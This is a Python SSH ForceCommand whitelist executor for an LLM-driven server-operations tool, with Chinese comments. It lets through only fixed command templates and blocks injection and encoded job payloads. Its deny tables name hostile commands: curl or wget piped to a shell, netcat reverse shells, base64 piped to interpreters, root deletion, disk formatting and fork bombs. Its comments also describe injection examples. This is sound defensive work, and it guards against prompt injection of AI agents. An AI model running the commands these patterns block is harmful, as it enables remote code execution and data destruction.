#!/usr/bin/env python3
"""agent-exec — 远端最小权限白名单执行器（P3，ForceCommand 入口）

用途
----
部署在每台被管的 Linux 目标机上，作为 SSH 账户 ``ckunagent`` 的 ``ForceCommand``：
所有经该账户 exec 通道进来的命令，sshd 都会先交给本脚本，由它判定
"是否属于运维工具（cKunAgentSSH 后端）实际会下发的固定命令模板之一"，
命中才执行，否则拒绝（写 stderr + 非 0 退出）。

它把"远端账户能做什么"收敛到客户端工具真正发出的**动词集合**，
与后端 fail-closed / 命令分级审批 / 路径校验构成纵深防御——即便 LLM 被
提示注入或工具误用，远端账户"默认什么都不该做超出白名单的事"。

设计：逐模板正则（raw-regex）
------------------------------
- 对**整条命令串**做带锚点的正则匹配（不是逐动词正则）。每个模板一条正则，
  可变参数用受限捕获组（工作区内路径 / 数字 / 服务名 / base64 字符集），
  整体不精确匹配就拒绝（默认拒绝）。比"逐动词 + 正则"更稳：不认识的组合
  一律拒绝，且不受 shell 分词细节（如 ``;`` 粘连）影响。
- 路径槽位接受 shlex.quote 的两种产物：裸路径或单引号路径，匹配后去引号
  再 normpath 校验必须落在 WORKSPACE / JOBS_ROOT 之内（``..`` 越界一律拒绝），
  与客户端 ``ops_common.is_traversal`` 形成客户端 + 服务端双校验。
- **shell 词法一致性复核（防命令注入的关键）**：白名单正则把槽位视为"无空白单
  token"，但 ``sh -c`` 会把槽位内的裸 ``;|&<>()`` 当命令分隔符、``$()``/反引号当
  展开执行——正则命中不等于 shell 语义安全（如 ``nc -zvw5 a;b 80`` 匹配 nc 模板，
  sh 却会独立执行 ``b``）。因此**所有用户控制槽位**额外强制：任何 shell 元字符
  都不得出现在单引号保护之外（见 ``_slot_shell_safe`` 的单引号状态扫描），统一
  封堵注入洞而无需逐槽位维护字符表。
- **job base64 洞递归封堵**：``job_run`` 远端启动把内部命令 base64 编码进
  run.sh。若只做表面匹配，攻击者可把 ``curl evil|sh`` 编码混进看似无害的
  ``echo <b64>|base64 -d>run.sh; setsid bash run.sh``。本执行器会**解码
  run.sh 并对内部命令做递归安全分类**（移植后端 HARDLINE/DANGEROUS 正则表），
  内部命中危险即拒绝。

与后端契约
----------
本执行器的白名单必须与后端 ``agent/tools/builtin/*`` 的 ``*_cmd`` 模板构建
函数一一对齐。后端契约测试 ``backend/tests/test_remote_whitelist_contract.py``
加载本文件、用真实后端模板生成命令并断言"全部放行 + 对抗命令全部拒绝"。
改后端模板或本白名单后务必跑该测试，防止两端漂移导致静默失配。

部署：见同目录 ``setup-ckun-agent.sh``。运行环境仅需 Python 3 标准库，
不依赖 cKunAgentSSH 后端包，可独立部署到远端。
"""
from __future__ import annotations

import base64
import os
import posixpath
import re
import shlex
import subprocess
import sys

# ══════════════════════════════════════════════════════════════
#   配置（可被环境变量覆盖，部署脚本按目标机布局设定）
# ══════════════════════════════════════════════════════════════

# 文件类操作允许的根（工件目录）。文件读/写/删/glob/grep 路径必须落在其下。
WORKSPACE = os.environ.get("CKUN_AGENT_WORKSPACE", "/srv/ckun-agent")
# 后台任务允许的根（远程 job 的脚本/日志/rc 落点）。与后端 ops_job._JOBS_ROOT 对齐。
JOBS_ROOT = os.environ.get("CKUN_AGENT_JOBS_ROOT", "/tmp/ckun_agent_jobs")
# 1 = 允许 job 内部命令被判 dangerous（仅 self-use 信任场景）；
# 0 = 内部命令命中 dangerous 即拒绝（默认，保守纵深）。hardline 恒拒绝。
ALLOW_DANGEROUS_JOB = os.environ.get("CKUN_AGENT_ALLOW_DANGEROUS_JOB", "0") == "1"

# ══════════════════════════════════════════════════════════════
#   job 内部命令安全分类（移植自 backend/agent/harness/safety.py）
#   用于递归封堵 job base64 洞。保持与后端同源语义。
#   两张表必须从 safety.py 同名表**逐字**移植（pattern 源串 + flags + reason），
#   单侧改动由 backend/tests/test_deploy_agent_exec_contract.py 判漂移。
#   注意移植边界：safety.py 对深层递归删除另有 token 级分析兜底，本副本不含
#   —— 本执行器只做表级判定（含 run.sh 内容的递归分类），纵深其余环节
#   （客户端可见命令的后端 classify + 审批流）在发送侧完成。
# ══════════════════════════════════════════════════════════════

HARDLINE_PATTERNS: list[tuple[re.Pattern, str]] = [
    (re.compile(r"\brm\s+(-[^\s]*\s+)*(/|/\*|/ \*)(?=[\s)\]}]|$)"), "recursive delete of root filesystem"),
    (re.compile(r"\bmkfs(\.[a-z0-9]+)?\b"), "format filesystem (mkfs)"),
    (re.compile(r"\bdd\b[^\n]*\bof=/dev/(?!zero\b|urandom\b|random\b|null\b|tty|pts|shm|console|fd)\S+"), "dd to raw block device"),
    (re.compile(r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"), "fork bomb"),
    (re.compile(r"\bshutdown\b", re.IGNORECASE), "system shutdown"),
    (re.compile(r"\breboot\b", re.IGNORECASE), "system reboot"),
    (re.compile(r"\bhalt\b", re.IGNORECASE), "system halt"),
    (re.compile(r"\bpoweroff\b", re.IGNORECASE), "system poweroff"),
    (re.compile(r"\binit\s+0\b"), "init 0 (halt)"),
    (re.compile(r"\bsystemctl\s+(poweroff|reboot|halt|kexec|suspend)\b", re.IGNORECASE), "systemctl power action"),
    (re.compile(r"\btelinit\s+(0|6)\b"), "telinit 0/6 (halt/reboot)"),
    (re.compile(r"\bkillall5\b"), "kill all processes"),
    (re.compile(r"\bkill\s+-9\s+-1\b"), "kill all processes by PID -1"),
    (re.compile(r"\bgit\s+push\s+(-f|--force)\s+origin\s+(main|master)\b", re.IGNORECASE), "force push to main/master"),
]

DANGEROUS_PATTERNS: list[tuple[re.Pattern, str]] = [
    # 与 safety.py 同步（2026-10-22 收紧）：只咬根目录本身（/ 后必须是串尾或空白）
    # —— 深层路径（`rm -rf /home/u/tmp`）不在此表误中，后端由 token 级分析按路径精确判档
    (re.compile(r"\brm\s+(-[^\s]*\s+)*-r[^\s]*\s+/(?:\s|$)", re.IGNORECASE), "recursive delete from root"),
    (re.compile(r"\brm\s+(-[^\s]*\s+)*-r[^\s]*\s+\*", re.IGNORECASE), "recursive delete with wildcard"),
    (re.compile(r"\bchmod\s+(-R\s+)?777\b", re.IGNORECASE), "chmod 777 (world writable)"),
    (re.compile(r"\bchown\s+-R\b", re.IGNORECASE), "recursive chown"),
    (re.compile(r"\bsudo\b", re.IGNORECASE), "sudo command"),
    (re.compile(r"\bsu\s", re.IGNORECASE), "switch user"),
    (re.compile(r"\bmv\s+.+\s+/dev/null\b"), "move to /dev/null (data loss)"),
    (re.compile(r"\b>\s*/dev/(sd|nvme|hd|mmcblk)"), "redirect to raw block device"),
    (re.compile(r"\bcurl\s+.+\s*\|\s*sh\b"), "curl pipe shell (remote execution)"),
    (re.compile(r"\bwget\s+.+\s*\|\s*sh\b"), "wget pipe shell (remote execution)"),
    (re.compile(r"\bgit\s+push\s+(-f|--force)\b", re.IGNORECASE), "force push"),
    (re.compile(r"\bgit\s+reset\s+--hard\b", re.IGNORECASE), "git reset hard"),
    (re.compile(r"\bgit\s+clean\s+-fdx\b", re.IGNORECASE), "git clean force"),
    (re.compile(r"\bdocker\s+(rm|prune|rmi)\b", re.IGNORECASE), "docker destructive"),
    (re.compile(r"\bnpm\s+uninstall\b", re.IGNORECASE), "npm uninstall"),
    (re.compile(r"\bpip\s+uninstall\b", re.IGNORECASE), "pip uninstall"),
    (re.compile(r"\bcrontab\s+-r\b", re.IGNORECASE), "remove crontab"),
    (re.compile(r"\biptables\s+-F\b", re.IGNORECASE), "flush iptables"),
    (re.compile(r"\bufw\s+disable\b", re.IGNORECASE), "disable firewall"),
    (re.compile(r":\(\)\s*\{"), "fork bomb pattern (partial)"),
    (re.compile(r"\bbase64\b[^\n|]*\|\s*(?:sh|bash|zsh|dash|ksh|python[0-9.]*|perl|ruby|node)\b"),
     "base64 decode piped to interpreter (encoded remote execution)"),
    (re.compile(r"\b(?:nc|ncat|netcat)\b[^\n]*\s-e\s+"), "netcat -e (reverse shell)"),
    (re.compile(r"\buser(?:add|mod|del)\b", re.IGNORECASE), "user account management (useradd/usermod/userdel)"),
    (re.compile(r"\bgroupadd\b", re.IGNORECASE), "group creation (groupadd)"),
    # 与 safety.py 同步（C-review C1）：改口令动作要求 passwd 处在命令位
    #（前面不能是 `/`）—— `cat /etc/passwd` 曾被本条误中成"修改账户口令"
    (re.compile(r"(?<![/\w])passwd\b", re.IGNORECASE), "password change (passwd)"),
    (re.compile(r"\bvisudo\b|\bvipw\b"), "direct edit of sudoers/pw database"),
    (re.compile(r"\bchmod\s+(?:-[A-Za-z]+\s+)*[0-7]{3,4}\b"), "chmod octal mode"),
    (re.compile(r"\bmknod\b|\bmkfifo\b"), "special file creation (mknod/mkfifo)"),
    (re.compile(r"\b(?:insmod|rmmod|modprobe)\b"), "kernel module operation"),
    (re.compile(r"\bsysctl\s+(?:-w|--system|-p)\b"), "sysctl runtime kernel parameter change"),
    (re.compile(r"\biptables6?\s+(?:--flush|-X)\b", re.IGNORECASE), "flush/delete iptables rules"),
    (re.compile(r"\bufw\s+(?:--force\s+)?reset\b", re.IGNORECASE), "ufw firewall reset"),
    (re.compile(r"\bat\s+-f\b", re.IGNORECASE), "schedule at job from file"),
    (re.compile(r"\bcrontab\b(?!\s+-[lL])\s+\S", re.IGNORECASE), "install/replace crontab"),
    (re.compile(r"\bapt(?:-get)?\s+(?:remove|purge|autoremove)\b", re.IGNORECASE), "package removal (apt)"),
    (re.compile(r"\b(?:yum|dnf)\s+(?:remove|erase)\b", re.IGNORECASE), "package removal (yum/dnf)"),
    # 与 safety.py 同步（F3）：awk/sed 的 system()/call 内联代码执行 ——
    # 两者在只读白名单里，电源动词不再匹配字符串内部后，这类只能由本条命中
    (re.compile(r"\b(?:awk|sed)\b[^\n]*\b(?:system|exec|popen|syscall|call)\s*\("),
     "awk/sed inline code execution"),
]


def classify_inner_cmd(command: str) -> tuple[str, str | None]:
    """对 job 内部命令做安全分类，返回 (level, reason)。
    level ∈ {"safe","dangerous","hardline"}，口径与后端 safety.classify_command 一致。
    """
    for pattern, reason in HARDLINE_PATTERNS:
        if pattern.search(command):
            return "hardline", reason
    for pattern, reason in DANGEROUS_PATTERNS:
        if pattern.search(command):
            return "dangerous", reason
    return "safe", None


# ══════════════════════════════════════════════════════════════
#   路径 / 参数校验
# ══════════════════════════════════════════════════════════════


def _in_root(path: str, root: str) -> bool:
    """normpath 后必须落在 root 之内（拒绝 `..` 越界，含跨层逃逸）。"""
    if not isinstance(path, str) or not path:
        return False
    n = os.path.normpath(path)
    r = os.path.normpath(root)
    return n == r or n.startswith(r + os.sep)


def _unquote(tok: str) -> str:
    """去掉 shlex.quote 产生的单引号包裹（含 \"'\"'\"' 转义形式）。

    两个 replace 分支不是死代码，是 fail-closed 防线的一部分（2026-10-26 复核）：
    - 合法 shlex.quote 产物（路径含单引号 → `'it'"'"'s'` 形态）永远到不了这里 ——
      其裸 `"` 会被 _slot_shell_safe 拒在 _match 阶段；
    - 但裸 token 分支（``[^\\s]+``）放行的**手工拼接**形态可以到达，例如
      ``'''\\''x'``（引号全平衡、无裸元字符，_slot_shell_safe 放行），此时
      inner 含 ``'\\''``，replace 会执行（实测探针确认可达）；
    - replace 的产出仍残留引号字符，而工作区路径不含引号 → _in_root 必然拒绝。
      即：这两个分支只会把 exotic 输入继续挡在门外，不可能把越界路径洗白成
      工作区内路径（内层引号数为奇数，无法被 replace 全部消掉），删除它们
      只会把"语义正确"降级为"碰巧也安全"，故保留。
    """
    if len(tok) >= 2 and tok.startswith("'") and tok.endswith("'"):
        inner = tok[1:-1]
        return inner.replace("'\"'\"'", "'").replace("'\\''", "'")
    return tok


def _ws(tok: str) -> bool:
    return _in_root(_unquote(tok), WORKSPACE)


def _job_dir(tok: str) -> bool:
    return _in_root(_unquote(tok), JOBS_ROOT)


# ── shell 词法一致性复核（方案 B）─────────────────────────────────────────────
# 白名单正则把槽位视为"无空白单 token"，但 ``sh -c`` 会把槽位里的**裸** ``;|&<>()``
# 当命令分隔/重定向、裸 ``$()``/反引号当展开执行——正则命中不等于 shell 语义安全
# （如 ``nc -zvw5 a;b 80`` 匹配 nc 模板，sh 却会独立执行 ``b``）。客户端虽用
# shlex.quote 给参数加单引号（单引号内 sh 视为字面量，惰性安全），但正则同时
# 接受**裸 token** 分支（``[^\s]+``），且未来客户端漂移/手工拼接都可能绕过 quote。
# 故对所有用户控制槽位额外强制：**任何 shell 元字符都不得出现在单引号保护之外**。
# 单引号成对闭合时，其中的 ``;``/``$()``/反引号/sh 空白都是字面量（如
# ``'/srv/a b;id'`` 是单个惰性词，安全）；双引号一律拒绝（sh 双引号内仍展开
# ``$()``/反引号，且 POSIX sh 与 bash 对混合引用语义分叉）。
# 状态机即完整判定：单引号内全部字面量，引号成对时引号自身在 sh 里消失，故
# 平衡引号（如 ``'a'b``→``ab``）安全放行、未闭合引号（结尾 ``in_single`` 仍真）
# 拒绝。客户端 shlex.quote 只产生"裸安全 token"或"整体单引号包裹"两种产物，
# 天然落在该判定内。统一封堵注入洞而无需逐槽位维护字符表，且不误伤多值槽位
# （如 job_alive 的多 PID、job_rcs 的多目录）与带空格的单引号槽位。
_SHELL_META = frozenset(';&|<>$`"\\\r\n')


def _slot_shell_safe(s: str) -> bool:
    """槽位原始串在 ``sh -c`` 下是否安全：元字符/裸单引号不得出现在单引号保护之外，
    且单引号必须成对闭合（未闭合引号会被 sh 剥离、其后的 ``;`` 重新成为命令分隔符）。"""
    if not isinstance(s, str):
        return False
    in_single = False
    for ch in s:
        if ch == "'":
            in_single = not in_single
        elif not in_single and ch in _SHELL_META:
            return False
    return not in_single  # 单引号必须闭合


def _slots_shell_safe(m: re.Match) -> bool:
    """模板匹配后复核：所有捕获槽位的原始值都必须 sh -c 安全（见 ``_slot_shell_safe``）。

    用 ``m.groups()`` 覆盖全部**位置**捕获组（模板正则均为位置组，无命名组），
    ``None``（未匹配的可选组）跳过。
    """
    return all(
        _slot_shell_safe(v) for v in m.groups() if v is not None
    )


# 路径槽位：裸路径（无空白/特殊）或单引号路径（shlex.quote 两种产物）
_PTOK = r"(?:'[^']*'|[^\s]+)"
# 服务名槽位（systemctl unit）
_SVC = r"(?:'[^']*'|[A-Za-z0-9_.-]+)"
_B64 = r"[A-Za-z0-9+/]+={0,2}"

# ── 日志清理根目录 / 模式约束（与后端 ops_log_cleanup 同源）──
_LOG_TMP_ROOTS = ("/tmp", "/var/tmp")
_LOG_MANAGED_ROOT = "/.trae-cn-server/manager-logs"
_LOG_ROOT = "/var/log"
_LOG_PROTECTED_ENTRIES = frozenset({
    "audit", "journal", "private", "sssd",
    "auth.log", "secure", "syslog", "messages",
    "kern.log", "daemon.log", "user.log",
    "cron", "cron.log", "wtmp", "btmp", "lastlog", "faillog",
})
_LOG_PATTERN_RE = re.compile(r"^[A-Za-z0-9*?._-]{1,128}$")
_LOG_ROOT_FORBIDDEN = frozenset("*?[]{};|&<>$`\"'\\")


# ══════════════════════════════════════════════════════════════
#   逐模板正则 + 参数约束校验
#   每个校验器：返回 True（放行）或抛 TemplateMismatch（拒绝）。
#   全部用带锚点正则整体匹配，默认拒绝。
# ══════════════════════════════════════════════════════════════


class TemplateMismatch(Exception):
    pass


def _match(pattern: re.Pattern, cmd: str) -> re.Match:
    m = pattern.match(cmd)
    if not m or m.end() != len(cmd):
        raise TemplateMismatch("shape mismatch")
    if not _slots_shell_safe(m):
        raise TemplateMismatch("shell metachar outside quotes in slot")
    return m


# ── 文件类（WORKSPACE 内）──────────────────────────────────

RE_B64_READ = re.compile(rf"^base64 -i ({_PTOK})$|^base64 ({_PTOK})$")


def v_b64_read(cmd: str) -> bool:
    m = _match(RE_B64_READ, cmd)
    tok = m.group(1) or m.group(2)
    if not _ws(tok):
        raise TemplateMismatch("path out of workspace")
    return True


# SFTP 子系统请求（非交互 shell）：客户端 SFTP 面板经同一受限连接使用。
# sshd 对子系统请求把命令置为 "sftp"，经 ForceCommand 进入本执行器。
RE_SFTP = re.compile(r"^sftp( -[A-Za-z0-9]+)*$")


def v_sftp(cmd: str) -> bool:
    _match(RE_SFTP, cmd)
    return True


RE_B64_WRITE = re.compile(rf"^printf '%s' '({_B64})' \| base64 -d > ({_PTOK})$")


def v_b64_write(cmd: str) -> bool:
    m = _match(RE_B64_WRITE, cmd)
    if not _ws(m.group(2)):
        raise TemplateMismatch("path out of workspace")
    return True


RE_RM_F = re.compile(rf"^rm -f ({_PTOK})$")


def v_rm_f(cmd: str) -> bool:
    m = _match(RE_RM_F, cmd)
    if not _ws(m.group(1)):
        raise TemplateMismatch("path out of workspace")
    return True


RE_NL_READ = re.compile(rf"^nl -ba ({_PTOK}) \| sed -n '(\d+),(\d+)p'$")


def v_nl_read(cmd: str) -> bool:
    m = _match(RE_NL_READ, cmd)
    if not _ws(m.group(1)):
        raise TemplateMismatch("path out of workspace")
    return True


RE_FIND = re.compile(rf"^find ({_PTOK}) -name ({_PTOK}) -type f$")


def v_find(cmd: str) -> bool:
    m = _match(RE_FIND, cmd)
    if not _ws(m.group(1)):
        raise TemplateMismatch("dir out of workspace")
    return True


RE_FILE_GREP = re.compile(rf"^grep -rnE --color=never ({_PTOK}) ({_PTOK}) \| head -n (\d+)$")


def v_file_grep(cmd: str) -> bool:
    m = _match(RE_FILE_GREP, cmd)
    if not _ws(m.group(2)):
        raise TemplateMismatch("path out of workspace")
    return True


RE_TAIL = re.compile(rf"^tail -n (\d+) ({_PTOK})$")


def v_tail(cmd: str) -> bool:
    m = _match(RE_TAIL, cmd)
    if not _ws(m.group(2)):
        raise TemplateMismatch("path out of workspace")
    return True


RE_LOG_GREP = re.compile(rf"^grep ({_PTOK}) ({_PTOK}) \| tail -n (\d+)$")


def v_log_grep(cmd: str) -> bool:
    m = _match(RE_LOG_GREP, cmd)
    if not _ws(m.group(2)):
        raise TemplateMismatch("path out of workspace")
    return True


# 有界日志清理：固定根目录 + 第一层普通文件 + 受限文件名模式 + 保留天数。
# 客户端模板见 backend/agent/tools/builtin/ops_log_cleanup.log_cleanup_cmd，
# 两端由 backend/tests/test_remote_whitelist_contract.py 跨端校验。
RE_LOG_CLEANUP = re.compile(
    rf"^find ({_PTOK}) -maxdepth 1 -type f -name ({_PTOK}) "
    rf"-mtime \+(\d+)( -delete)? -print$"
)


def _posix_real(path: str) -> str:
    """realpath 后统一成 / 分隔（远端是 Linux；测试在 Windows 上也能跑）。"""
    return os.path.realpath(path).replace(os.sep, "/")


def _log_cleanup_root_ok(root: str) -> bool:
    """根目录必须落在临时目录 / 应用日志子目录 / agent 托管日志目录内。

    用 realpath 判定：`/var/log/app` 是指向 /etc 的 symlink 时，realpath
    会落到 /etc，从而被拒绝 —— 纯字符串前缀匹配挡不住这种形态。
    """
    if not root.startswith("/"):
        return False
    if any(c in _LOG_ROOT_FORBIDDEN for c in root):
        return False
    if any(ord(c) < 32 for c in root):
        return False
    # 只接受规范形态：尾斜杠（find 可能跟随 symlink）、`..`、`//`、`.` 一律拒绝
    if posixpath.normpath(root) != root:
        return False
    real = _posix_real(root)
    for allowed in _LOG_TMP_ROOTS + (_LOG_MANAGED_ROOT,):
        base = _posix_real(allowed)
        if real == base or real.startswith(base + "/"):
            return True
    log_root = _posix_real(_LOG_ROOT)
    if not real.startswith(log_root + "/"):
        return False
    first = real[len(log_root) + 1:].split("/", 1)[0]
    return first not in _LOG_PROTECTED_ENTRIES


def v_log_cleanup(cmd: str) -> bool:
    m = _match(RE_LOG_CLEANUP, cmd)
    root = _unquote(m.group(1))
    pattern = _unquote(m.group(2))
    days = int(m.group(3))
    if not 1 <= days <= 3650:
        raise TemplateMismatch("log cleanup days out of range")
    if not _log_cleanup_root_ok(root):
        raise TemplateMismatch("log cleanup root out of scope")
    if pattern.startswith("-") or not _LOG_PATTERN_RE.fullmatch(pattern):
        raise TemplateMismatch("bad log cleanup pattern")
    return True


# ── 服务 / 观测 / 网络（只读，参数受限）──────────────────────

RE_SYSTEMCTL = re.compile(rf"^systemctl (status|start|stop|restart) ({_SVC})$")


def v_systemctl(cmd: str) -> bool:
    m = _match(RE_SYSTEMCTL, cmd)
    if not re.fullmatch(r"[A-Za-z0-9_.-]+", _unquote(m.group(2))):
        raise TemplateMismatch("bad service name")
    return True


RE_SYS_OVERVIEW = re.compile(
    r'^echo "\[CPU 负载\]"; uptime 2>/dev/null\n'
    r'echo "\[内存\]"; free -m 2>/dev/null\n'
    r'echo "\[磁盘 TOP (\d+)\]"; df -h 2>/dev/null \| head -n (\d+)\n'
    r'echo "\[开机时长\]"; uptime -s 2>/dev/null\n'
    r'echo "\[内核版本\]"; uname -r 2>/dev/null$'
)


def v_sys_overview(cmd: str) -> bool:
    m = _match(RE_SYS_OVERVIEW, cmd)
    top, head_n = int(m.group(1)), int(m.group(2))
    if not (1 <= top <= 20 and head_n == top + 1):
        raise TemplateMismatch("bad top")
    return True


# 环境画像：固定的只读探测，**无参数**（后端 ops_obs.host_profile_cmd 的唯一对应模板）。
# 无参数 → 一条精确正则即可，无需捕获组校验；改动两端必须同步，由契约测试锁定。
RE_HOST_PROFILE = re.compile(
    r'^echo "\[发行版\]"; cat /etc/os-release 2>/dev/null \| head -n 5\n'
    r'echo "\[init\]"; ps -p 1 -o comm= 2>/dev/null\n'
    r'echo "\[包管理器\]"; command -v apt-get dnf yum apk pacman zypper docker 2>/dev/null\n'
    r'echo "\[身份\]"; id -un 2>/dev/null; pwd 2>/dev/null\n'
    r"true$"
)


def v_host_profile(cmd: str) -> bool:
    _match(RE_HOST_PROFILE, cmd)
    return True


RE_PS = re.compile(rf"^ps -eo pid,pcpu,pmem,stat,comm,args \| grep ({_PTOK}) \| grep -v grep$")


def v_ps(cmd: str) -> bool:
    _match(RE_PS, cmd)
    return True


RE_NC = re.compile(rf"^nc -zvw(\d+) ({_PTOK}) (\d+)$")


def v_nc(cmd: str) -> bool:
    _match(RE_NC, cmd)
    return True


_BASH_PROBE_INNER = "exec 3<>/dev/tcp/$1/$2 && echo OK || echo FAIL; exec 3<&-"
# 正则转义版：字面 $ / | 必须 \$ / \|（否则 $ 变行尾锚点、| 变正则或）
_BASH_PROBE_INNER_RE = (
    "exec 3<>/dev/tcp/\\$1/\\$2 && echo OK \\|\\| echo FAIL; exec 3<&-"
)
RE_BASH_PROBE = re.compile(
    rf"^bash -c '{_BASH_PROBE_INNER_RE}' probe ({_PTOK}) (\d+)$"
)


def v_bash_probe(cmd: str) -> bool:
    _match(RE_BASH_PROBE, cmd)
    return True


RE_SS_LISTEN = re.compile(rf"^ss -ltn 2>/dev/null \| grep :(\d+)$")
RE_NETSTAT_LISTEN = re.compile(rf"^netstat -an 2>/dev/null \| grep :(\d+)$")


def v_ss_listen(cmd: str) -> bool:
    _match(RE_SS_LISTEN, cmd)
    return True


def v_netstat_listen(cmd: str) -> bool:
    _match(RE_NETSTAT_LISTEN, cmd)
    return True


# ── 后台任务（JOBS_ROOT 内）────────────────────────────────

RE_JOB_LAUNCH = re.compile(
    rf"^mkdir -p (\S+)\n"
    rf"rm -f \1/rc\n"
    rf"echo ({_B64}) \| base64 -d > \1/run\.sh\n"
    rf"setsid bash \1/run\.sh > \1/out\.log 2>&1 < /dev/null &\n"
    rf"echo \$!$"
)


def v_job_launch(cmd: str) -> bool:
    m = _match(RE_JOB_LAUNCH, cmd)
    d, b64 = m.group(1), m.group(2)
    if not _job_dir(d):
        raise TemplateMismatch("job dir out of root")
    # 关键：解码 run.sh，对内部命令递归安全分类（封堵 base64 洞）
    try:
        content = base64.b64decode(b64).decode("utf-8", errors="replace")
    except Exception:
        raise TemplateMismatch("bad job b64")
    lines = content.splitlines()
    if len(lines) < 3 or lines[0].strip() != "#!/bin/bash":
        raise TemplateMismatch("bad run.sh header")
    if lines[-1].strip() != f"echo $? > {d}/rc":
        raise TemplateMismatch("bad run.sh trailer")
    inner = "\n".join(lines[1:-1]).strip()
    if not inner:
        raise TemplateMismatch("empty inner cmd")
    level, reason = classify_inner_cmd(inner)
    if level == "hardline":
        raise TemplateMismatch(f"inner hardline: {reason}")
    if level == "dangerous" and not ALLOW_DANGEROUS_JOB:
        raise TemplateMismatch(f"inner dangerous: {reason}")
    return True


RE_JOB_KILL = re.compile(
    r"^kill -TERM -- -([1-9]\d*) 2>/dev/null; sleep 3; "
    r"if kill -0 -- -\1 2>/dev/null; then "
    r"kill -KILL -- -\1 2>/dev/null; sleep 1; "
    r"kill -0 -- -\1 2>/dev/null && echo CKUNJOB_STILL \|\| echo CKUNJOB_DEAD; "
    r"else echo CKUNJOB_DEAD; fi$"
)


def v_job_kill(cmd: str) -> bool:
    _match(RE_JOB_KILL, cmd)
    return True


RE_JOB_ALIVE = re.compile(
    r"^for p in ([1-9]\d*(?: [1-9]\d*)*); do kill -0 -- -\$p 2>/dev/null "
    r"&& echo \"\$p ALIVE\" \|\| echo \"\$p DEAD\"; done$"
)


def v_job_alive(cmd: str) -> bool:
    _match(RE_JOB_ALIVE, cmd)
    return True


RE_JOB_RCS = re.compile(
    r"^for J in (\S+(?: \S+)*); do R=''; \[ -f \$J/rc \] && R=\$\(cat \$J/rc\); "
    r"printf '%s\\n' \"\$R\"; done$"
)


def v_job_rcs(cmd: str) -> bool:
    m = _match(RE_JOB_RCS, cmd)
    for d in m.group(1).split():
        if not _job_dir(d):
            raise TemplateMismatch("job dir out of root")
    return True


RE_JOB_READ = re.compile(
    r"^RC=; \[ -f (\S+)/rc \] && RC=\$\(cat \1/rc\); "
    r"SZ=0; \[ -f \1/out\.log \] && SZ=\$\(wc -c < \1/out\.log\); "
    r"printf 'CKUNJOB_RC=%s\\nCKUNJOB_SZ=%s\\n' \"\$RC\" \"\$SZ\"; "
    r"\[ -f \1/out\.log \] && tail -c \+\d+ \1/out\.log$"
)


def v_job_read(cmd: str) -> bool:
    m = _match(RE_JOB_READ, cmd)
    if not _job_dir(m.group(1)):
        raise TemplateMismatch("job dir out of root")
    return True


# ── 模板注册表（顺序无关，命中任一即放行）────────────────────

TEMPLATES: list[tuple[str, callable]] = [
    ("sftp", v_sftp),
    ("b64_read", v_b64_read),
    ("b64_write", v_b64_write),
    ("rm_f", v_rm_f),
    ("nl_read", v_nl_read),
    ("find", v_find),
    ("file_grep", v_file_grep),
    ("tail", v_tail),
    ("log_grep", v_log_grep),
    ("log_cleanup", v_log_cleanup),
    ("systemctl", v_systemctl),
    ("sys_overview", v_sys_overview),
    ("host_profile", v_host_profile),
    ("ps", v_ps),
    ("nc", v_nc),
    ("bash_probe", v_bash_probe),
    ("ss_listen", v_ss_listen),
    ("netstat_listen", v_netstat_listen),
    ("job_launch", v_job_launch),
    ("job_kill", v_job_kill),
    ("job_alive", v_job_alive),
    ("job_rcs", v_job_rcs),
    ("job_read", v_job_read),
]


# ══════════════════════════════════════════════════════════════
#   对外分类入口（契约测试直接 import 调用）
# ══════════════════════════════════════════════════════════════


def classify(command: str) -> tuple[bool, str]:
    """判定一条远端命令是否在白名单内。返回 (allowed, reason)。默认拒绝。"""
    if not command or not command.strip():
        return False, "empty command"
    cmd = command.strip()
    for name, validator in TEMPLATES:
        try:
            if validator(cmd):
                return True, name
        except TemplateMismatch:
            continue
        except Exception:
            continue
    return False, "no whitelisted template matched"


# ══════════════════════════════════════════════════════════════
#   main：ForceCommand 入口
# ══════════════════════════════════════════════════════════════


def main() -> int:
    cmd = os.environ.get("SSH_ORIGINAL_COMMAND", "").strip()
    if not cmd:
        sys.stderr.write("agent-exec: 无 SSH_ORIGINAL_COMMAND（非 exec 通道）\n")
        return 1
    ok, reason = classify(cmd)
    if not ok:
        sys.stderr.write(f"agent-exec DENY: {reason}\n")
        try:
            sys.stderr.flush()
        except Exception:
            pass
        return 126  # 命令不可执行（与"白名单拒绝"语义一致）
    try:
        proc = subprocess.run(["/bin/sh", "-c", cmd],
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception as e:  # pragma: no cover
        sys.stderr.write(f"agent-exec EXEC ERROR: {e}\n")
        return 127
    if proc.stdout:
        sys.stdout.write(proc.stdout.decode("utf-8", errors="replace"))
    if proc.stderr:
        sys.stderr.write(proc.stderr.decode("utf-8", errors="replace"))
    sys.stdout.flush()
    sys.stderr.flush()
    return proc.returncode


if __name__ == "__main__":
    sys.exit(main())
